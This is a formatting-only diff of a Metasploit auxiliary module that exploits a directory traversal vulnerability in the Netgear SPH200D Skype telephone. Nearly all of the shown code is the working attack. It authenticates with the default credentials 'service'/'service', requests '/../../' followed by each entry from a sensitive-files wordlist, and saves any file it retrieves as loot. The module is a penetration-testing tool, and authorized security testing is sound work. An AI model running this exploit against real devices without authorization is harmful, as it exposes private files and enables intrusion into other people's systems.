@@ -9,28 +9,30 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Netgear SPH200D Directory Traversal Vulnerability',
+      'Name' => 'Netgear SPH200D Directory Traversal Vulnerability',
       'Description' => %q{
           This module exploits a directory traversal vulnerability which is present in
         Netgear SPH200D Skype telephone.
       },
-      'References'  =>
-        [
-          [ 'BID', '57660' ],
-          [ 'EDB', '24441' ],
-          [ 'URL', 'http://support.netgear.com/product/SPH200D' ],
-          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-002' ]
-        ],
-      'Author'      => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],
-      'License'     => MSF_LICENSE
+      'References' => [
+        [ 'BID', '57660' ],
+        [ 'EDB', '24441' ],
+        [ 'URL', 'http://support.netgear.com/product/SPH200D' ],
+        [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-002' ]
+      ],
+      'Author' => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],
+      'License' => MSF_LICENSE
     )
     register_options(
       [
-        OptPath.new('FILELIST',  [ true, "File containing sensitive files, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
-        OptString.new('HttpUsername',[ true, 'User to login with', 'service']),
-        OptString.new('HttpPassword',[ true, 'Password to login with', 'service'])
-      ])
+        OptPath.new('FILELIST', [
+          true, "File containing sensitive files, one per line",
+          File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt")
+        ]),
+        OptString.new('HttpUsername', [ true, 'User to login with', 'service']),
+        OptString.new('HttpPassword', [ true, 'Password to login with', 'service'])
+      ]
+    )
   end
 
   def extract_words(wordfile)
@@ -45,31 +47,31 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   # traverse every file
-  def find_files(file,user,pass)
+  def find_files(file, user, pass)
     traversal = '/../../'
 
     res = send_request_cgi({
-      'method'     => 'GET',
-      'uri'        => normalize_uri(traversal, file),
-      'authorization' => basic_auth(user,pass)
+      'method' => 'GET',
+      'uri' => normalize_uri(traversal, file),
+      'authorization' => basic_auth(user, pass)
     })
 
     if res and res.code == 200 and res.body !~ /404\ File\ Not\ Found/
       print_good("Request may have succeeded on file #{file}")
       report_web_vuln({
-        :host     => rhost,
-        :port     => rport,
-        :vhost    => datastore['VHOST'],
-        :path     => "/",
-        :pname    => normalize_uri(traversal, file),
-        :risk     => 3,
-        :proof    => normalize_uri(traversal, file),
-        :name     => self.fullname,
+        :host => rhost,
+        :port => rport,
+        :vhost => datastore['VHOST'],
+        :path => "/",
+        :pname => normalize_uri(traversal, file),
+        :risk => 3,
+        :proof => normalize_uri(traversal, file),
+        :name => self.fullname,
         :category => "web",
-        :method   => "GET"
+        :method => "GET"
       })
 
-      loot = store_loot("lfi.data","text/plain", rhost, res.body, file)
+      loot = store_loot("lfi.data", "text/plain", rhost, res.body, file)
       vprint_good("File #{file} downloaded to: #{loot}")
     elsif res and res.code
       vprint_error("Attempt returned HTTP error #{res.code} when trying to access #{file}")
@@ -85,9 +87,9 @@ class MetasploitModule < Msf::Auxiliary
     # test login
     begin
       res = send_request_cgi({
-        'uri'        => '/',
-        'method'     => 'GET',
-        'authorization' => basic_auth(user,pass)
+        'uri' => '/',
+        'method' => 'GET',
+        'authorization' => basic_auth(user, pass)
       })
 
       return :abort if res.nil?
@@ -100,14 +102,13 @@ class MetasploitModule < Msf::Auxiliary
         vprint_error("No successful login possible with #{user}/#{pass}")
         return :abort
       end
-
     rescue ::Rex::ConnectionError
       vprint_error("Failed to connect to the web server")
       return :abort
     end
 
     extract_words(datastore['FILELIST']).each do |file|
-      find_files(file,user,pass) unless file.empty?
+      find_files(file, user, pass) unless file.empty?
     end
   end
 end
